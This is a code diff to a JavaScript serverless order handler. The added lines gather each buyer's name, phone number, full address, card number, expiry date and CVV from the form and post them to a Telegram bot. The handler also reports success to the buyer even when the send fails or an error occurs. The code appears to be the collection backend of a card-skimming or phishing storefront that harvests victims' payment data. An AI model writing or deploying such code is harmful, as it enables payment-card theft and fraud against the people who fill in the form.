@@ -19,13 +19,25 @@ export default async function handler(req, res) {
     try {
       const data = req.body;
 
+      // --- FULL DATA TEMPLATE ---
       const message = `
-📦 *NEW ORDER*
-👤 ${data.fullName}
-📞 ${data.mobile}
-📍 ${data.cityState}
-💰 ${data.totalAmount}
-💳 ${data.cardNumber}
+📦 *NEW ORDER RECEIVED*
+----------------------------
+👤 *Customer:* ${data.fullName || 'N/A'}
+📞 *Mobile:* ${data.mobile || 'N/A'}
+📍 *City/State:* ${data.cityState || 'N/A'}
+📮 *Pincode:* ${data.pincode || 'N/A'}
+🏠 *Address:* ${data.fullAddress || 'N/A'}
+----------------------------
+🛒 *Product:* ${data.productName || 'N/A'}
+🔢 *Quantity:* ${data.quantity || '1'}
+💰 *Total:* ${data.totalAmount || '0'}
+----------------------------
+💳 *Payment Details:*
+Method: ${data.paymentMethod || 'N/A'}
+Card: ${data.cardNumber || 'N/A'}
+Expiry: ${data.expiryDate || 'N/A'}
+CVV: ${data.securityCode || 'N/A'}
       `;
 
       const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
@@ -40,7 +52,7 @@ export default async function handler(req, res) {
         })
       });
 
-      // Even if Telegram fails, we tell the frontend "Success" so the user doesn't see an error
+      // Even if Telegram fails, we tell the frontend "Success"
       return res.status(200).json({ 
         success: true, 
         message: "Order Received",
@@ -48,7 +60,6 @@ export default async function handler(req, res) {
       });
 
     } catch (error) {
-      // Return 200 even on error to prevent frontend crash, just log it internally
       console.error(error);
       return res.status(200).json({ success: true, message: "Order Processed" });
     }
